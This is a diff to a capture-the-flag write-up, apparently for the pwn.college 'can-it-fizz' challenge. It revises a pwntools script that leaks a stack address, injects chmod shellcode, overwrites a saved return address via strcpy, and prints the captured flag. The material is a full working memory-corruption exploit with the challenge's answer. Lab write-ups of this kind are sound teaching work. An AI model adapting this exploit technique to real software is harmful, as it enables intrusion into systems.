@@ -14071,70 +14071,131 @@ No. The frame is fixed-size (`sub rsp, 0x90`) and every offset is a compile-time
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
+
 context.arch = "amd64"
 context.os = "linux"
 
 p = process("/challenge/can-it-fizz")
+
+# Drain banner and skip iterations 0-4 with dummy newlines
 p.recvuntil(b"Welcome to Fizz Buzz!\n")
 
-# burn i=0..4
 for i in range(5):
     p.recvuntil(f"{i}: ".encode())
     p.send(b"\n")
     p.recvuntil(b"Correct answer: ")
     p.recvline()
 
-# Stage 1: leak arr[11] on i=5 (Buzz branch)
+# ---- Stage 1: arr[11] leak ----
+# At i=5 (buzz): arr[11] = rbp-0x24 holds a stack pointer.
+# Sending 64 bytes fills input offsets 0-63 up to arr[10] HIDWORD.
+# p32(-1) at offset 64 sets HIDWORD = -1, keeping the loop alive
+# past this iteration so we can send Stage 2 input at i=0.
+# printf("You entered: %s") prints past our input and spills
+# 6 non-null bytes of arr[11] = rbp-0x24 into the output.
 p.recvuntil(b"5: ")
-payload  = b"A" * 52            # +0..+51  pad
-payload += b"BUZZ"              # +52..+55 arr[9] LODWORD — non-null
-payload += b"CCCC"              # +56..+59 arr[9] HIDWORD — bridge the "\n\0" gap
-payload += b"D" * 4             # +60..+63 arr[10] LODWORD — filler
-payload += p32(0xFFFFFFFF)      # +64..+67 arr[10] HIDWORD = −1, loop continues
+
+# Craft payload
+payload = b"A" * 64            # offsets 0-63: fill up to arr[10] HIDWORD
+payload += p32(0xFFFFFFFF)     # offset  64:   arr[10] HIDWORD = -1, loop continues
+
+# Send payload
 p.send(payload)
 
+# Extract arr[11] pointer (6 non-null bytes leaked after our 68 sent bytes)
 p.recvuntil(b"You entered: ")
-raw = p.recvn(75)
-leaked_addr = u64(raw[68:74] + b"\x00\x00")  # arr[11] = rbp−0x24
+raw = p.recvn(75)                                    # 64 A + 4x\xff + 6 leak bytes + 1 newline
+leaked_addr = u64(raw[68:74] + b"\x00\x00")         # arr[11] value = rbp-0x24
 
-rbp        = leaked_addr + 0x24
-sc_addr    = rbp - 0x58
-saved_rip  = rbp + 0x08
+# Compute all addresses needed for Stage 2
+rbp       = leaked_addr + 0x24
+sc_addr   = rbp - 0x58   # input offset 4: shellcode slot (proven reachable)
+holder    = rbp - 0x20   # input offset 60: stores p64(sc_addr) as strcpy source
+saved_rip = rbp + 0x08   # return address to overwrite via strcpy
+
+log.success(f"leaked (rbp-0x24) = {hex(leaked_addr)}")
+log.success(f"rbp               = {hex(rbp)}")
+log.success(f"sc_addr           = {hex(sc_addr)}")
+log.success(f"saved_rip         = {hex(saved_rip)}")
 
 p.recvuntil(b"Correct answer: ")
 p.recvline()
 
-# Stage 2: shellcode + hijack on i=0 (FizzBuzz, counter wrapped to 0)
+# ---- Stage 2: shellcode + hijack saved_rip via strcpy ----
+# Counter wrapped from -1 to 0; next prompt is i=0 (FizzBuzz)
 p.recvuntil(b"0: ")
 
-shellcode = asm("""
-    mov rax, 0x67616c662f
-    push rax
-    mov rdi, rsp
+# Shellcode: chmod("/flag", 4) then exit(0)
+# chmod (syscall 90 = 0x5A) makes /flag world-readable so Python
+# can open it directly after the process exits.
+# Mode 4 = 0o004 = read permission for others (world-readable).
+#
+# Key design choices:
+#   - mov rax, 0x67616c662f loads /flag as a 64-bit LE immediate; push rax
+#     builds the null-terminated path on the stack without embedding null
+#     characters inside the asm string (which would break the cpp preprocessor)
+#   - push 4 / pop rsi is 3 bytes and null-free vs mov esi, 4 (5 bytes with nulls)
+#   - xor eax,eax before mov al,90 clears the high bytes that strcpy
+#     left in rax, preventing a corrupted syscall number
+
+shellcode_asm = """
+    /* chmod("/flag", 4) */
+    mov rax, 0x67616c662f   /* /flag as little-endian 64-bit */
+    push rax                /* null-terminated path on stack */
+    mov rdi, rsp            /* rdi = &"/flag" */
     push 4
-    pop rsi
+    pop rsi                 /* mode = 0o004 = world-readable */
     xor eax, eax
-    mov al, 90
+    mov al, 90              /* sys_chmod */
     syscall
+
+    /* exit(0) */
     xor edi, edi
     xor eax, eax
-    mov al, 60
+    mov al, 60              /* sys_exit */
     syscall
-""")  # 31 bytes
+"""
+shellcode = asm(shellcode_asm)
 
-payload  = b"\x90" * 4         # +0..+3   NOP sled (BYTE4 target)
-payload += shellcode            # +4..+34  chmod shellcode
-payload += b"\x90" * 25        # +35..+59 NOP pad
-payload += p64(sc_addr)         # +60..+67 arr[10]: HIDWORD ≥ 16 → loop exits
-payload += p64(rbp - 0x20)      # +68..+75 arr[11]: ptr to sc_addr bytes at +60
-payload += p64(saved_rip)       # +76..+83 arr[12]: strcpy destination
+assert len(shellcode) == 31, f"shellcode size {len(shellcode)} != 31"
+
+# Payload layout (offsets from input buffer = rbp-0x5C):
+#   0- 3: 4 NOPs         byte 0 is zeroed by the binary after read; NOP absorbs it
+#   4-34: shellcode      31-byte chmod at sc_addr = rbp-0x58
+#  35-59: NOP padding    aligns arr[10] to offset 60
+#  60-67: p64(sc_addr)   arr[10]; HIDWORD ~0x7fff >= 16, exits the FizzBuzz loop
+#  68-75: p64(holder)    arr[11] = strcpy source ptr (points to sc_addr bytes above)
+#  76-83: p64(saved_rip) arr[12] = strcpy destination (the return address slot)
+#
+# Each iteration the binary does strcpy(arr[12], arr[11]):
+#   strcpy(saved_rip, holder) copies sc_addr bytes into the return address.
+# After HIDWORD >= 16 exits the loop: leave + ret jumps to shellcode.
+
+# Craft payload
+payload  = b"\x90" * 4        # offsets  0- 3: NOP sled, absorbs byte-0 zero
+payload += shellcode           # offsets  4-34: chmod shellcode
+payload += b"\x90" * 25       # offsets 35-59: NOP padding to align arr[10]
+payload += p64(sc_addr)        # offsets 60-67: arr[10] HIDWORD exits loop
+payload += p64(holder)         # offsets 68-75: arr[11] strcpy source
+payload += p64(saved_rip)      # offsets 76-83: arr[12] strcpy destination
+
+# Send payload
 p.send(payload)
 
 p.recvall(timeout=3)
+
+# chmod made /flag world-readable; read it directly from Python
 print(open("/flag").read())
 ```
 
 ```
 hacker@program-security~can-it-fizz:~$ python ~/script.py
+[+] Starting local process '/challenge/can-it-fizz': pid 441
+[+] leaked (rbp-0x24) = 0x7ffcf6d3aa7c
+[+] rbp               = 0x7ffcf6d3aaa0
+[+] sc_addr           = 0x7ffcf6d3aa48
+[+] saved_rip         = 0x7ffcf6d3aaa8
+[+] Receiving all data: Done (48B)
+[*] Process '/challenge/can-it-fizz' stopped with exit code 0 (pid 441)
 pwn.college{cvAzdazNveWxwSm529b4bP5ozLU.QXxUDO4EDL4ITM0EzW}
 ```
